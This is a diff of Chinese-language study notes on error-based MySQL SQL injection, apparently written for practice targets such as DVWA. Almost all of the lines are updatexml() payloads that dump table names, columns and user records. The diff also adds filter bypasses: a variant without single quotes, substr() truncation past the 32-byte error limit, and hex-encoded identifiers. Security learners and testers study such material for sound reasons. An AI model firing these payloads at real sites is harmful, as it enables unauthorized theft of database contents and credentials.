@@ -31,16 +31,23 @@ https://www.cnblogs.com/c1047509362/p/12806297.html
 1. `1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))，0x7e),1))='1` 爆当前数据库表信息
 1. `1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=wp_links)and(table_name='users')),0x7e),1))='1` 爆user表字段信息
 1. `1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #` 爆数据库内容
+ref：https://www.codenong.com/cs106450896/
 
+#### 报错注入变种：无单引号版
+1. aid=(select%201%20and%201=updatexml(1,concat(0x7e,(select(user())),0x73),1))&target=1
 
 ### 注入各种问题处理方法
 1. 提示输出信息超过一行：使用group_concat,eg:3'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='test')),0x7e),1))='1
-1. 字符串超过group_concat限制，使用limit 0,1单独输出，limit 0,1 表示输出第一个数据。 0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）。
+字符串超过group_concat限制，使用limit 0,1单独输出，limit 0,1 表示输出第一个数据。 0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）。
 ref：https://blog.csdn.net/forwardss/article/details/104682924
 1. 替代空格：
     * 使用括号，eg：`3'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='test')),0x7e),1))='1`
     * 使用内联注释：`/**/`
-1. 报错注入，返回值XPATH syntax error有长度限制，为32bytes。
+1. 报错注入，返回值XPATH syntax error有长度限制，为32bytes。使用substr截取需要的部分回显`updatexml(1,concat(0x7e,substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,32),0x73),1)`
+1. 单引号被转义为\：用0x5C替代单引号
+ref：https://www.cnblogs.com/lwfiwo/p/11314408.html
+    1. 引号绕过导致table_name='user'不能用：user转换成十六进制编码0x7573657273
+    ref：https://blog.csdn.net/weixin_39846361/article/details/113301753
 
 ### 其它资源
 1. sqlmap源码payload构成：https://www.anquanke.com/post/id/188173#h2-3
